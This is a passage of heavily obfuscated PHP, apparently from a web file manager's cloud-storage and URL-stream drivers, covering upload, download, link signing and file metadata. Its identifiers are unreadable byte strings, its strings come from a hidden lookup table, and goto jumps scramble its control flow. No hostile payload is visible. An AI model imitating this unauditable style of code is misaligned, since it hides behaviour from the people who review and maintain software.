E¼õ™Á½¤÷: $e­“Ş™¦×¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aŠˆÉÄÌ¶á = $e­“Ş™¦×¨[33]; $aê¯‹™”¼ƒ = 1000; goto C×òÎğÛì¢; C×òÎğÛì¢: $E‡ÅÕß×£Í = 0; $eÕ¶éÂ¤„ = 0; $cÙÍÔ‰İ‰ = rtrim($Däê§«ğŸå, $e­“Ş™¦×¨[8]) . $e­“Ş™¦×¨[8]; goto dÊÕÏÒÜå; dÊÕÏÒÜå: while (!0) { $A¥²Õºñ™­ = $this->fileList($Däê§«ğŸå, $aŠˆÉÄÌ¶á, $aê¯‹™”¼ƒ); if (!$A¥²Õºñ™­) { return !1; } $aŠˆÉÄÌ¶á = isset($A¥²Õºñ™­[$e­“Ş™¦×¨[1240]]) ? $A¥²Õºñ™­[$e­“Ş™¦×¨[1240]] : $e­“Ş™¦×¨[33]; $c¿×ÉÂÃ¡Œ = isset($A¥²Õºñ™­[$e­“Ş™¦×¨[1241]]) ? $A¥²Õºñ™­[$e­“Ş™¦×¨[1241]] : array(); if (empty($c¿×ÉÂÃ¡Œ)) { break; } $aÌ‡Š¤“Š = array_to_keyvalue($c¿×ÉÂÃ¡Œ, $e­“Ş™¦×¨[33], $e­“Ş™¦×¨[29]); $F„ß–İÔ¦Ş = array_count_values($aÌ‡Š¤“Š); $cöä¹íØÇî = isset($F„ß–İÔ¦Ş[$e­“Ş™¦×¨[76]]) ? $F„ß–İÔ¦Ş[$e­“Ş™¦×¨[76]] : 0; $Fø®Œ”¬‹£ = count($aÌ‡Š¤“Š) - $cöä¹íØÇî; if ($BÕ±Š„Ğîª) { $eÕ¶éÂ¤„ += $cöä¹íØÇî; $E‡ÅÕß×£Í += $Fø®Œ”¬‹£; if ($c®ì…ˆíÊà < $aê¯‹™”¼ƒ) { break; } continue; } if ($a¼Îìœ×È) { if ($Fø®Œ”¬‹£) { return !0; } } else { if ($cöä¹íØÇî) { return !0; } } if (count($c¿×ÉÂÃ¡Œ) < $aê¯‹™”¼ƒ) { break; } } if ($BÕ±Š„Ğîª) { return array($e­“Ş™¦×¨[197] => $E‡ÅÕß×£Í, $e­“Ş™¦×¨[198] => $eÕ¶éÂ¤„); } return !1; goto dïˆÂĞ¼…æ; dïˆÂĞ¼…æ: } public function listAll($Ağà¨’Ó¢¸) { $a½¢‹’¥‹ = array(); $this->recursionAllFiles($Ağà¨’Ó¢¸, $a½¢‹’¥‹); return $a½¢‹’¥‹; } public function canRead($cˆŒ‰¿Á) { return $this->exist($cˆŒ‰¿Á) ? !0 : !1; } public function canWrite($DÉ‘š•ô¹‰) { return $this->exist($DÉ‘š•ô¹‰) ? !0 : !1; } public function getContent($dÚäæÊ¦ö¥) { return $this->fileSubstr($dÚäæÊ¦ö¥, 0, -1); } public function setContent($Dß®È¾Ú, $DõÏ°êÖĞ = '') { $bê‰¤ìäÅ¬ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$DõÏ°êÖĞ) { $dŞŸ¦áèÛ = $this->ussRequest($Dß®È¾Ú, $bê‰¤ìäÅ¬[218]); return $dŞŸ¦áèÛ[$bê‰¤ìäÅ¬[1022]]; } $Eåµ•òÔí¼ = $this->tempFile($this->pathThis($Dß®È¾Ú)); file_put_contents($Eåµ•òÔí¼, $DõÏ°êÖĞ); if ($this->upload($Dß®È¾Ú, $Eåµ•òÔí¼)) { $this->tempFileRemve($Eåµ•òÔí¼); return !0; } return !1; } public function fileSubstr($d¾â»¿ÆŸá, $DĞ¼Ö†ù´ô, $B¨óÑ†ÏÂ½) { $CÙ„å´»…Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!($CÓä‰ëì¦Ê = $this->link($d¾â»¿ÆŸá))) { return !1; } $FŒö©¬£ŠÏ = !1; if ($B¨óÑ†ÏÂ½ > 0) { $Fº¨‡‡Şİã = $DĞ¼Ö†ù´ô + $B¨óÑ†ÏÂ½ - 1; $FŒö©¬£ŠÏ = array($CÙ„å´»…Ã[1202] . $DĞ¼Ö†ù´ô . $CÙ„å´»…Ã[416] . $Fº¨‡‡Şİã); } $Fí‰Î×ˆ» = url_request($CÓä‰ëì¦Ê, $CÙ„å´»…Ã[222], !1, $FŒö©¬£ŠÏ); return $Fí‰Î×ˆ»[$CÙ„å´»…Ã[686]] ? $Fí‰Î×ˆ»[$CÙ„å´»…Ã[1024]] : !1; } public function upload($Dçô‹¢‡Ÿ‰, $a¨¸«Ñ Øå, $b‰óë£¿” = false, $b›„¯òÛÇ = REPEAT_REPLACE) { goto eµ˜¶…’Á; eµ˜¶…’Á: $a¯¤Ø¦öÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fƒù£µ®±› = IO::size($a¨¸«Ñ Øå); if ($fƒù£µ®±› <= 1024 * 1024 * 200) { $FĞÇ‹ª»íÓ = array($a¯¤Ø¦öÍ[1242] . $a¨¸«Ñ Øå); $dŠĞÁÇã… = $this->ussRequest($Dçô‹¢‡Ÿ‰, $a¯¤Ø¦öÍ[220], $FĞÇ‹ª»íÓ); return $dŠĞÁÇã…[$a¯¤Ø¦öÍ[1022]] ? $this->getPathOuter($Dçô‹¢‡Ÿ‰) : !1; } goto cà³¥›‹Êè; cà³¥›‹Êè: $dè°™Ùéæ„ = 1024 * 1024 * 10; $FŠŸÛ•ô¯ = array($a¯¤Ø¦öÍ[1243], $a¯¤Ø¦öÍ[1244] . $fƒù£µ®±›, $a¯¤Ø¦öÍ[1245], $a¯¤Ø¦öÍ[1246] . $dè°™Ùéæ„); $dŠĞÁÇã… = $this->ussRequest($Dçô‹¢‡Ÿ‰, $a¯¤Ø¦öÍ[220], !1, $FŠŸÛ•ô¯); goto FÌ­Â¶; EåÖÕùã¦¤: $F¼¼ƒ‡Ä¿µ = $C¸¼˜äõÛ•[$a¯¤Ø¦öÍ[1247]]; $Fòš¯ö…ß = fopen($a¨¸«Ñ Øå, $a¯¤Ø¦öÍ[1152]); if (!$Fòš¯ö…ß) { return !1; } goto D‹ŒŠóºº¡; F³²…‡÷: $dŠĞÁÇã… = $this->ussRequest($Dçô‹¢‡Ÿ‰, $a¯¤Ø¦öÍ[220], !1, $FŠŸÛ•ô¯); return $dŠĞÁÇã…[$a¯¤Ø¦öÍ[1022]] ? $this->getPathOuter($b™õèã’•Ç) : !1; goto AÍÒˆÍ¡ƒ…; D‹ŒŠóºº¡: do { $d‰Ù£‡ö¼æ = $C¸¼˜äõÛ•[$a¯¤Ø¦öÍ[1248]]; fseek($Fòš¯ö…ß, $CëÛ‡å”†Í); $f¶ĞßÉ¦¨› = fread($Fòš¯ö…ß, $d‰Ù£‡ö¼æ); $Eµßõ¨ç³â = 0; do { $Eµßõ¨ç³â++; $C¸¼˜äõÛ• = $this->uploadPart($Dçô‹¢‡Ÿ‰, $C¸¼˜äõÛ•, $f¶ĞßÉ¦¨›); } while (!$C¸¼˜äõÛ• && $Eµßõ¨ç³â < 3); if (!$C¸¼˜äõÛ•) { return !1; } $F¼¼ƒ‡Ä¿µ = $C¸¼˜äõÛ•[$a¯¤Ø¦öÍ[1247]]; $CëÛ‡å”†Í += $d‰Ù£‡ö¼æ; } while ($F¼¼ƒ‡Ä¿µ != -1); fclose($Fòš¯ö…ß); $FŠŸÛ•ô¯ = array($a¯¤Ø¦öÍ[1249], $a¯¤Ø¦öÍ[1250] . $C¸¼˜äõÛ•[$a¯¤Ø¦öÍ[1251]], $a¯¤Ø¦öÍ[1245]); goto F³²…‡÷; FÌ­Â¶: if (!$dŠĞÁÇã…[$a¯¤Ø¦öÍ[1022]]) { return !1; } $C¸¼˜äõÛ• = $dŠĞÁÇã…[$a¯¤Ø¦öÍ[1024]]; $CëÛ‡å”†Í = 0; goto EåÖÕùã¦¤; AÍÒˆÍ¡ƒ…: } private function uploadPart($eæ’Îê§¡ò, $d•ùËòóÙâ, &$b´ä¯Ò¼¡) { $d®Ì­ªÊ®— =& $_SERVER[ºÖÙÂŒäÉê‡]; $DõÖÇ‹è = array($d®Ì­ªÊ®—[1252], $d®Ì­ªÊ®—[1250] . $d•ùËòóÙâ[$d®Ì­ªÊ®—[1251]], $d®Ì­ªÊ®—[1253] . $d•ùËòóÙâ[$d®Ì­ªÊ®—[1247]], $d®Ì­ªÊ®—[1254] . $d•ùËòóÙâ[$d®Ì­ªÊ®—[1248]]); $b¦¬±‚ò• = $this->ussRequest($eæ’Îê§¡ò, $d®Ì­ªÊ®—[220], $b´ä¯Ò¼¡, $DõÖÇ‹è); return !$b¦¬±‚ò•[$d®Ì­ªÊ®—[1022]] ? $b¦¬±‚ò•[$d®Ì­ªÊ®—[1022]] : $b¦¬±‚ò•[$d®Ì­ªÊ®—[1024]]; } public function uploadFormData($B‘‡ê¦À“â, $fï¡İ„Üº´ = 3600) { return $this->uploadPolicy($B‘‡ê¦À“â, $fï¡İ„Üº´); } public function multiUploadFormData($d£§â´±ßÚ, $DÑä½šÛ¬† = 3600) { $d‰Ô×âƒŒß =& $_SERVER[ºÖÙÂŒäÉê‡]; $DË¬êë£Ë™ = (int) $GLOBALS[$d‰Ô×âƒŒß[7]][$d‰Ô×âƒŒß[77]]; return $this->uploadPolicy($d£§â´±ßÚ, $DÑä½šÛ¬†, $DË¬êë£Ë™); } private function uploadPolicy($E´Ôƒíë«¤, $Eí•îõùÎØ = 3600, $a”æøî®¼ = 0) { goto E²çƒµºàö; fà‡·¼ëÓ: $D£õ®«…» = base64_encode(hash_hmac($aÚÕ¤¡‹—[1224], "\x50\117\123\x54\x26{$Fœ£æÖ‹œ}\x26{$Aš”´¯ª…¸}\46{$e–Š¶ÓÛ¾Å}", md5("{$this->userpass}"), !0)); $E¿ßªÎ½ = array($aÚÕ¤¡‹—[1095] => $e–Š¶ÓÛ¾Å, $aÚÕ¤¡‹—[1259] => "\x55\x50\131\x55\116\40{$this->username}\x3a{$D£õ®«…»}", $aÚÕ¤¡‹—[165] => $this->endpoint . $Fœ£æÖ‹œ); return $E¿ßªÎ½; goto fÑøñƒ¼òÑ; E²çƒµºàö: $aÚÕ¤¡‹— =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fœ£æÖ‹œ = $aÚÕ¤¡‹—[8] . $this->bucket; $Aš”´¯ª…¸ = gmdate($aÚÕ¤¡‹—[1187]); goto a“ñ†êãÚÜ; a“ñ†êãÚÜ: $eÒî¾˜ = array($aÚÕ¤¡‹—[1255] => $this->bucket, $aÚÕ¤¡‹—[1256] => $E´Ôƒíë«¤, $aÚÕ¤¡‹—[1257] => time() + $Eí•îõùÎØ, $aÚÕ¤¡‹—[1258] => $Aš”´¯ª…¸); if ($a”æøî®¼) { $eÒî¾˜[$aÚÕ¤¡‹—[1173]] = $a”æøî®¼; } $e–Š¶ÓÛ¾Å = base64_encode(json_encode($eÒî¾˜)); goto fà‡·¼ëÓ; fÑøñƒ¼òÑ: } public function download($a‡ˆÜÆ¹¬Œ, $C²„–”–°) { goto fë¯Ğàš¸; bŒàÂÛ³ğ: $dŠãÔ“ºÜ = 1024 * 200; $fØ÷óì‡¶¦ = fopen($dÎß³ô†°í, $_SERVER[ºÖÙÂŒäÉê‡][1208]); while (!0) { $FëÑ£ƒ‹•ä = $this->fileSubstr($a‡ˆÜÆ¹¬Œ, $b­Ş‹÷ñ, $dŠãÔ“ºÜ); if ($FëÑ£ƒ‹•ä === !1) { return !1; } fwrite($fØ÷óì‡¶¦, $FëÑ£ƒ‹•ä); $b­Ş‹÷ñ += $dŠãÔ“ºÜ; if (strlen($FëÑ£ƒ‹•ä) < $dŠãÔ“ºÜ) { break; } } goto e”ñø¢‡¢; fë¯Ğàš¸: $dÎß³ô†°í = IO::getPathInner(IO::mkfile($C²„–”–°)); if (!($C²­™Û¬ç¥ = $this->link($a‡ˆÜÆ¹¬Œ))) { return !1; } $b­Ş‹÷ñ = 0; goto bŒàÂÛ³ğ; e”ñø¢‡¢: fclose($fØ÷óì‡¶¦); return $C²„–”–°; goto EíÂÈ‡á·¤; EíÂÈ‡á·¤: } public function link($eà„£•é, $A¹”é­á = array()) { $FÔ‡Øµ ØÑ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eà„£•é = trim($eà„£•é, $FÔ‡Øµ ØÑ[8]); if (!empty($this->token)) { $b˜øÍÈ½Ş = strtotime(date($FÔ‡Øµ ØÑ[1260])); $c«¢ã¨‹´Ä = substr(md5($this->token . $FÔ‡Øµ ØÑ[277] . $b˜øÍÈ½Ş . $FÔ‡Øµ ØÑ[1261] . $eà„£•é), 12, 8) . $b˜øÍÈ½Ş; $A¹”é­á[] = $FÔ‡Øµ ØÑ[1262] . $c«¢ã¨‹´Ä; } $d†Â’äƒ¢ç = !empty($A¹”é­á) ? $FÔ‡Øµ ØÑ[69] . implode($FÔ‡Øµ ØÑ[277], $A¹”é­á) : $FÔ‡Øµ ØÑ[33]; return $this->getHost() . $FÔ‡Øµ ØÑ[8] . $eà„£•é . $d†Â’äƒ¢ç; } public function fileOut($f×ˆõë¡·, $FŒ¸óŒÃ»à = false, $fìÓÃ°¼‡ = false, $c¼Ú÷°Şòï = '') { if (!$fìÓÃ°¼‡) { $fìÓÃ°¼‡ = $this->pathThis($f×ˆõë¡·); } $Cíğå¿Ä¥ø = $FŒ¸óŒÃ»à ? array($_SERVER[ºÖÙÂŒäÉê‡][1263] . rawurlencode($fìÓÃ°¼‡)) : array(); $bĞ‚¾ÎÆÑ = $this->link($f×ˆõë¡·, $Cíğå¿Ä¥ø); $this->fileOutLink($bĞ‚¾ÎÆÑ); } public function fileOutServer($cÒ‘ÕÉ¥©±, $d‚¹³à×® = false, $AâÜ‘¹ÒÊš = false, $f‘îãŒ„È = '') { parent::fileOut($cÒ‘ÕÉ¥©±, $d‚¹³à×®, $AâÜ‘¹ÒÊš, $f‘îãŒ„È); } public function fileOutImage($cÊÔ—ÏŠ˜, $F¬¶ƒ·âÍˆ = 250) { $C‡ÛĞ­‘çâ = $this->link($cÊÔ—ÏŠ˜ . $_SERVER[ºÖÙÂŒäÉê‡][1264] . $F¬¶ƒ·âÍˆ); $this->fileOutLink($C‡ÛĞ­‘çâ); } public function fileOutImageServer($DÑÔÔášà‚, $EŠÎá¥‹È¶ = 250) { parent::fileOutImage($DÑÔÔášà‚, $EŠÎá¥‹È¶); } public function hashMd5($c”İ¤ˆ¤•) { $f›Í²øöŒæ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aßˆÖˆ£§“ = $this->objectMeta($c”İ¤ˆ¤•); return isset($aßˆÖˆ£§“[$f›Í²øöŒæ[202]]) ? $aßˆÖˆ£§“[$f›Í²øöŒæ[202]] : !1; } public function size($FİÌäíŸÂŸ) { $aöñ¹²Ûñ¥ = $this->objectMeta($FİÌäíŸÂŸ); return $aöñ¹²Ûñ¥ ? $aöñ¹²Ûñ¥[$_SERVER[ºÖÙÂŒäÉê‡][77]] : 0; } public function info($B…ƒÎ‘ŞËø) { if ($this->isFolder($B…ƒÎ‘ŞËø)) { return $this->folderInfo($B…ƒÎ‘ŞËø); } else { if ($this->isFile($B…ƒÎ‘ŞËø)) { return $this->fileInfo($B…ƒÎ‘ŞËø); } } return !1; } public function exist($CõêÜ†ÊÄ) { return $this->isFile($CõêÜ†ÊÄ) || $this->isFolder($CõêÜ†ÊÄ); } public function isFile($B‚¿É¢à¨¯) { return !$this->isFolder($B‚¿É¢à¨¯) && $this->objectMeta($B‚¿É¢à¨¯); } public function isFolder($aåÒÓ—ïÌ) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][228], $aåÒÓ—ïÌ); } protected function objectMeta($DÀÀé†™ª) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][229], $DÀÀé†™ª); } protected function _objectMeta($b‰†ÄÊÍÅ·) { goto FÜ¥õ¦ìˆ; FÜ¥õ¦ìˆ: $bŠÎšÒ¼Íó =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($b‰†ÄÊÍÅ· == $bŠÎšÒ¼Íó[33] || $b‰†ÄÊÍÅ· == $bŠÎšÒ¼Íó[8]) { return array(); } $bÂÅ§Ş¹ä = $this->ussRequest($b‰†ÄÊÍÅ·, $bŠÎšÒ¼Íó[1265]); goto cİ¢Œ†Ù©®; cİ¢Œ†Ù©®: if (!$bÂÅ§Ş¹ä[$bŠÎšÒ¼Íó[1022]]) { return null; } $a´çˆÉµ¡‡ = isset($bÂÅ§Ş¹ä[$bŠÎšÒ¼Íó[1024]]) ? $bÂÅ§Ş¹ä[$bŠÎšÒ¼Íó[1024]] : array(); if (!isset($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1266]])) { return null; } goto a’ÊöãëÓ™; a’ÊöãëÓ™: $DİŞ„â©ØÍ = array($bŠÎšÒ¼Íó[28] => get_path_this($b‰†ÄÊÍÅ·), $bŠÎšÒ¼Íó[29] => isset($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1266]]) ? $a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1266]] : null, $bŠÎšÒ¼Íó[77] => isset($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1267]]) ? $a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1267]] : null, $bŠÎšÒ¼Íó[202] => isset($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1268]]) ? $a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1268]] : null, $bŠÎšÒ¼Íó[1235] => isset($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1269]]) ? $a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1269]] : null); $DİŞ„â©ØÍ[$bŠÎšÒ¼Íó[1236]] = isset($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1270]]) ? strtotime($a´çˆÉµ¡‡[$bŠÎšÒ¼Íó[1270]]) : $DİŞ„â©ØÍ[$bŠÎšÒ¼Íó[1235]]; return $DİŞ„â©ØÍ; goto e¹¢çÅ“Ú•; e¹¢çÅ“Ú•: } protected function _isFolder($b·ª³¯ğèï) { $c’Å±»¢ôÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($b·ª³¯ğèï == $c’Å±»¢ôÎ[33] || $b·ª³¯ğèï == $c’Å±»¢ôÎ[8]) { return !0; } $cÖœÏƒÉÈ— = $this->objectMeta($b·ª³¯ğèï); return isset($cÖœÏƒÉÈ—[$c’Å±»¢ôÎ[29]]) && $cÖœÏƒÉÈ—[$c’Å±»¢ôÎ[29]] == $c’Å±»¢ôÎ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D£ÀƒÁ¹—™ = false) { } public function exist($eè–••æ„) { $Då­ø±‚• = $this->info($eè–••æ„); return $Då­ø±‚•[$_SERVER[ºÖÙÂŒäÉê‡][194]]; } public function isFile($eğ±Éë÷î) { $F›†›í•ğ™ = $this->info($eğ±Éë÷î); return $F›†›í•ğ™[$_SERVER[ºÖÙÂŒäÉê‡][194]]; } public function isFolder($aà÷•ôô¯Ù) { return !1; } public function size($bî±“Éãøå) { $eİ÷¶ŒîĞ¬ = $this->info($bî±“Éãøå); return $eİ÷¶ŒîĞ¬[$_SERVER[ºÖÙÂŒäÉê‡][77]]; } public function info($AäÜ‰Ò—†±) { return $this->infoParse($AäÜ‰Ò—†±); } public function infoAuth($A˜»‹‹ÇÑ) { return $this->infoParse($A˜»‹‹ÇÑ); } public function infoWithChildren($B›ÈÊÄĞ±Ñ) { return $this->infoParse($B›ÈÊÄĞ±Ñ); } public function infoFull($e•¯É¢©Åì) { return $this->infoParse($e•¯É¢©Åì); } private function infoParse($eÉºÍßØØô) { $fŞÜÍ›â˜± =& $_SERVER[ºÖÙÂŒäÉê‡]; $cØğêŠÄ‹Ö = $this->header($eÉºÍßØØô); if (!$cØğêŠÄ‹Ö || !$cØğêŠÄ‹Ö[$fŞÜÍ›â˜±[686]]) { return !1; } $EÜêÛ´Â¶ = _get($cØğêŠÄ‹Ö, $fŞÜÍ›â˜±[330], 0); $d§ã„¥­´ = array($fŞÜÍ›â˜±[28] => $cØğêŠÄ‹Ö[$fŞÜÍ›â˜±[28]], $fŞÜÍ›â˜±[75] => $eÉºÍßØØô, $fŞÜÍ›â˜±[29] => $fŞÜÍ›â˜±[163], $fŞÜÍ›â˜±[77] => intval($EÜêÛ´Â¶), $fŞÜÍ›â˜±[156] => get_path_ext($cØğêŠÄ‹Ö[$fŞÜÍ›â˜±[28]]), $fŞÜÍ›â˜±[1144] => $EÜêÛ´Â¶ > 0 && $cØğêŠÄ‹Ö[$fŞÜÍ›â˜±[1271]], $fŞÜÍ›â˜±[1145] => !1); return $d§ã„¥­´; } private function header($B¾Ş²‹†½) { if (isset(self::$_cacheHeader[$B¾Ş²‹†½])) { return self::$_cacheHeader[$B¾Ş²‹†½]; } self::$_cacheHeader[$B¾Ş²‹†½] = url_header($B¾Ş²‹†½); return self::$_cacheHeader[$B¾Ş²‹†½]; } public function hashSimple($aßĞºÉÔ¡, $bòäËá—‚¬ = false) { goto còÀŒƒŠ¾; Aò½İëöç‚: $c°ôçŞÃôã = $dÀÏİ´²á [$b‹°æ²•…§[77]]; $fÌØãÉ‡º = 200; $B…Ôîˆî¡¶ = 50; goto FÀùøÓ§¡; FÀùøÓ§¡: if ($c°ôçŞÃôã <= $fÌØãÉ‡º * $B…Ôîˆî¡¶) { return md5($this->fileSubstr($aßĞºÉÔ¡, 0, $c°ôçŞÃôã)) . $c°ôçŞÃôã; } $dƒÙàÁ‹ğ = intval($c°ôçŞÃôã / $B…Ôîˆî¡¶); $e¿‰èÄ¼ÇÛ = $b‹°æ²•…§[33]; goto EÎ‡¹®ˆĞÛ; còÀŒƒŠ¾: $b‹°æ²•…§ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÀÏİ´²á  = $this->info($aßĞºÉÔ¡); if (!$dÀÏİ´²á  || !$dÀÏİ´²á [$b‹°æ²•…§[194]]) { return !1; } goto Aò½İëöç‚; EÎ‡¹®ˆĞÛ: $F‰Éã Ä²´ = timeFloat(); $bˆŞ‘Ë±ƒŠ = 15; for ($d¸ìÔï  = 0; $d¸ìÔï  < $B…Ôîˆî¡¶; $d¸ìÔï ++) { if (timeFloat() - $F‰Éã Ä²´ > $bˆŞ‘Ë±ƒŠ) { return !1; } $F†ÕÕâªÒ‚ = $this->fileSubstr($aßĞºÉÔ¡, $dƒÙàÁ‹ğ * $d¸ìÔï , $fÌØãÉ‡º); if (!$F†ÕÕâªÒ‚) { return !1; } $e¿‰èÄ¼ÇÛ .= $F†ÕÕâªÒ‚; } goto f×ÂÒ×”Í™; f×ÂÒ×”Í™: $e¿‰èÄ¼ÇÛ .= $this->fileSubstr($aßĞºÉÔ¡, $c°ôçŞÃôã - $fÌØãÉ‡º, $fÌØãÉ‡º); return md5($e¿‰èÄ¼ÇÛ) . $c°ôçŞÃôã; goto F†ÜÔ¤•âã; F†ÜÔ¤•âã: } public function getContent($Cã‹…¦Ô”É) { return $this->fileSubstr($Cã‹…¦Ô”É); } public function fileSubstr($Cˆƒ¡¤µæ¿, $CÄé¸øÊİ‡ = 0, $C‹æèÍŠ¡Ë = -1) { goto cÙÌ®æ‡±; cÙÌ®æ‡±: $a¥¥ä×Ÿº° =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bè‹çè›¢è = $this->info($Cˆƒ¡¤µæ¿); if (!$Bè‹çè›¢è || !$Bè‹çè›¢è[$a¥¥ä×Ÿº°[194]] && $Bè‹çè›¢è[$a¥¥ä×Ÿº°[77]] > 1024 * 1024 * 10) { return !1; } goto dù£¢ÅÖÕï; dù£¢ÅÖÕï: if ($C‹æèÍŠ¡Ë === -1) { $C‹æèÍŠ¡Ë = $Bè‹çè›¢è[$a¥¥ä×Ÿº°[77]]; } if ($C‹æèÍŠ¡Ë == 0) { return $a¥¥ä×Ÿº°[33]; } $F¹ºŞõĞÚò = array($a¥¥ä×Ÿº°[1272] . $CÄé¸øÊİ‡ . $a¥¥ä×Ÿº°[713] . ($CÄé¸øÊİ‡ + $C‹æèÍŠ¡Ë - 1)); goto Däèø°¼™Í; Däèø°¼™Í: $b­¦Ğ…å¨ = url_request($Cˆƒ¡¤µæ¿, $a¥¥ä×Ÿº°[222], !1, $F¹ºŞõĞÚò, !1, !1, 1); return $b­¦Ğ…å¨[$a¥¥ä×Ÿº°[1024]] ? $b­¦Ğ…å¨[$a¥¥ä×Ÿº°[1024]] : $a¥¥ä×Ÿº°[33]; goto fÆ“Œãôâ; fÆ“Œãôâ: } public function download($d„ç©¦”ˆ, $A¡è×‘÷‡¬) { Downloader::start($d„ç©¦”ˆ, $A¡è×‘÷‡¬); return $A¡è×‘÷‡¬; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($E•Èë˜†Óİ, $F¶»¡Àßø© = '') { goto BÏÖë«éÏ; AÊ¡æÒóí: return $this->info ? !0 : !1; goto eÏÜ£É¾–; Aî¡öËèñË: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$E•Èë˜†Óİ])) { self::$_chunkBuffer[$E•Èë˜†Óİ] = array(); } goto AÊ¡æÒóí; BÏÖë«éÏ: $this->info = $this->info($E•Èë˜†Óİ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ºÖÙÂŒäÉê‡][75]]; goto Aî¡öËèñË; eÏÜ£É¾–: } function stream_read($aèÕÚÆÃ Ó) { $D£ÄÖÔãÇæ = $this->fileSubstr($this->pose, $aèÕÚÆÃ Ó); $this->pose += strlen($D£ÄÖÔãÇæ); return $D£ÄÖÔãÇæ; } public function stream_tell() { return $this->pose; } public function stream_seek($eáß–Â×ÃĞ, $Dò‹°ø²‚) { $C¼âÖÔ¬‚³ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($Dò‹°ø²‚ == SEEK_SET) { $this->pose = $eáß–Â×ÃĞ; } else { if ($Dò‹°ø²‚ == SEEK_CUR) { $this->pose += $eáß–Â×ÃĞ; } else { if ($Dò‹°ø²‚ == SEEK_END) { $this->pose = $this->info[$C¼âÖÔ¬‚³[77]] + intval($eáß–Â×ÃĞ); } } } if ($eáß–Â×ÃĞ < 0) { $this->pose = $this->info[$C¼âÖÔ¬‚³[77]] + $eáß–Â×ÃĞ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ºÖÙÂŒäÉê‡][77]]; } public function stream_close() { return !0; } public function url_stat($F–º†™³±é, $då‰¼µÜŠœ) { $e¾°ìÁÈÙğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bˆ‘ÛˆâåÉ = $this->info($F–º†™³±é); return array($e¾°ìÁÈÙğ[1273] => 0, $e¾°ìÁÈÙğ[1274] => 0, $e¾°ìÁÈÙğ[12] => 32768 + 511, $e¾°ìÁÈÙğ[1275] => 0, $e¾°ìÁÈÙğ[1276] => 0, $e¾°ìÁÈÙğ[1277] => 0, $e¾°ìÁÈÙğ[1278] => 0, $e¾°ìÁÈÙğ[77] => $bˆ‘ÛˆâåÉ[$e¾°ìÁÈÙğ[77]], $e¾°ìÁÈÙğ[1279] => $bˆ‘ÛˆâåÉ[$e¾°ìÁÈÙğ[1150]], $e¾°ìÁÈÙğ[1236] => $bˆ‘ÛˆâåÉ[$e¾°ìÁÈÙğ[106]], $e¾°ìÁÈÙğ[1235] => $bˆ‘ÛˆâåÉ[$e¾°ìÁÈÙğ[193]], $e¾°ìÁÈÙğ[1280] => 0, $e¾°ìÁÈÙğ[1281] => 0); } static $fileInfo = array(); public function info($C¹Ù¢÷Ç³) { $E¦Ö‚¡šƒ‘ = $_SERVER[ºÖÙÂŒäÉê‡][1282]; if (isset(self::$fileInfo[$C¹Ù¢÷Ç³])) { return self::$fileInfo[$C¹Ù¢÷Ç³]; } if (substr($C¹Ù¢÷Ç³, 0, strlen($E¦Ö‚¡šƒ‘)) != $E¦Ö‚¡šƒ‘) { return !1; } self::$fileInfo[$C¹Ù¢÷Ç³] = IO::info(substr($C¹Ù¢÷Ç³, strlen($E¦Ö‚¡šƒ‘))); return self::$fileInfo[$C¹Ù¢÷Ç³]; } public static function read($eÉ¡¦ĞòŞŸ, $c¥ˆ‰¨˜Ÿß, $DÃ…¾õàÌ) { goto E²»îŠ¥¶ã; f‹’òö’Ó: $dâƒ¬“µ·á = 8192; fseek($c„†°Ó·âó, $c¥ˆ‰¨˜Ÿß, SEEK_SET); $d¾Ù©Ë”‘Ã = $Eœ¾‚Š‰ë[33]; goto dÖèÙªØ²Ú; d»ˆ÷¥…Ãš: return $d¾Ù©Ë”‘Ã; goto A®Ú¡Îäºª; E²»îŠ¥¶ã: $Eœ¾‚Š‰ë =& $_SERVER[ºÖÙÂŒäÉê‡]; $c„†°Ó·âó = fopen($eÉ¡¦ĞòŞŸ, $Eœ¾‚Š‰ë[1152]); if (!$c„†°Ó·âó) { return $Eœ¾‚Š‰ë[33]; } goto f‹’òö’Ó; dÖèÙªØ²Ú: $fšÍ§ù—¤Î = 0; while ($fšÍ§ù—¤Î < $DÃ…¾õàÌ) { $Cò­Ãñ¨ê½ = min($dâƒ¬“µ·á, $DÃ…¾õàÌ - $fšÍ§ù—¤Î); $d¾Ù©Ë”‘Ã .= fread($c„†°Ó·âó, $Cò­Ãñ¨ê½); $fšÍ§ù—¤Î += $Cò­Ãñ¨ê½; } fclose($c„†°Ó·âó); goto d»ˆ÷¥…Ãš; A®Ú¡Îäºª: } public function fileSubstr($Bİõ†øÂ‡, $D¥•ÉîÈ¢‹) { goto f¤ ˆÆê¥; E¥¶…¨ìã: $fÄßÚ„¶‡å = 0; $Dª¥Çå“± = 0; $F‹ÎÖ¤¯ò = 